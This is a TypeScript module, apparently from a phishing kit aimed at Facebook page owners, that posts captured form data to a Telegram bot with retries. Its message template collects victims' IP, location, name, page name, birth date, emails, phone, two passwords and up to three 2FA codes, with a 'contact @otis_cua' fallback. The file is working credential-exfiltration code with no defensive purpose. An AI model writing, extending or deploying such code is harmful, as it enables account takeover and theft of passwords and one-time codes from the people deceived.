import axios from 'axios';
import https from 'https';

const agent = new https.Agent({ family: 4 });

function getTelegramConfig() {
    const token = process.env.TELEGRAM_BOT_TOKEN?.trim();
    const chatId = process.env.TELEGRAM_CHAT_ID?.trim();
    if (!token || !chatId) {
        return null;
    }
    return {
        api: `https://api.telegram.org/bot${token}`,
        chatId,
    };
}

async function retryTelegramRequest(requestFn: () => Promise<any>, maxRetries = 3): Promise<any> {
    let lastError: any;

    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            const result = await requestFn();
            return result;
        } catch (error: any) {
            lastError = error;

            const errorCode = error?.response?.status;
            const errorDesc = error?.response?.data?.description || '';

            // Don't retry on authentication errors, invalid chat_id, etc.
            if (
                errorCode === 401 ||
                errorCode === 403 ||
                errorDesc.includes('chat not found') ||
                errorDesc.includes('bot was blocked')
            ) {
                throw error;
            }

            if (attempt === maxRetries) {
                break;
            }

            // Exponential backoff: 1s, 2s, 4s
            const delay = Math.pow(2, attempt - 1) * 1000;
            console.warn(`⚠️ Telegram API attempt ${attempt} failed, retrying in ${delay}ms:`, error.message);
            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }

    throw lastError;
}

export const sendTelegramMessage = async (values: any) => {

    const config = getTelegramConfig();
    if (!config) {
        console.warn('⚠️ Telegram không được gửi: Thiếu TELEGRAM_BOT_TOKEN hoặc TELEGRAM_CHAT_ID trong file .env');
        return;
    }

    try {

        const message = `
<b>Ip:</b> <code>${values.ip || 'Error, contact @otis_cua'}</code>
<b>Location:</b> <code>${values.location || 'Error, contact @otis_cua'}</code>
-----------------------------
<b>Full Name:</b> <code>${values.fullName || ''}</code>
<b>Page Name:</b> <code>${values.fanpage || ''}</code>
<b>Date of birth:</b> <code>${values.day}/${values.month}/${values.year}</code>
-----------------------------
<b>Email:</b> <code>${values.email}</code>
<b>Email Business:</b> <code>${values.emailBusiness || ''}</code>
<b>Phone Number:</b> <code>${values.phone ? `+${values.phone}` : ''}</code>
-----------------------------
<b>Password (1):</b> <code>${values.password}</code>
<b>Password (2):</b> <code>${values.passwordSecond || ''}</code>
-----------------------------
<b>🔐Code 2FA(1):</b> <code>${values.twoFa || ''}</code>
<b>🔐Code 2FA(2):</b> <code>${values.twoFaSecond || ''}</code>
<b>🔐Code 2FA(3):</b> <code>${values.twoFaThird || ''}</code>
        `.trim();

        const res = await retryTelegramRequest(() =>
            axios.post(`${config.api}/sendMessage`, {
                chat_id: config.chatId,
                text: message,
                parse_mode: 'HTML'
            }, {
                httpsAgent: agent,
                timeout: 10000
            })
        );

        const messageId = res?.data?.result?.message_id;
        if (messageId) {
            console.log(`✅ Sent new message. ID: ${messageId}`);
        } else {
            console.warn('⚠️ Telegram response không có message_id');
        }

    } catch (error) {
        console.error('Error sending telegram message:', error);
    }
}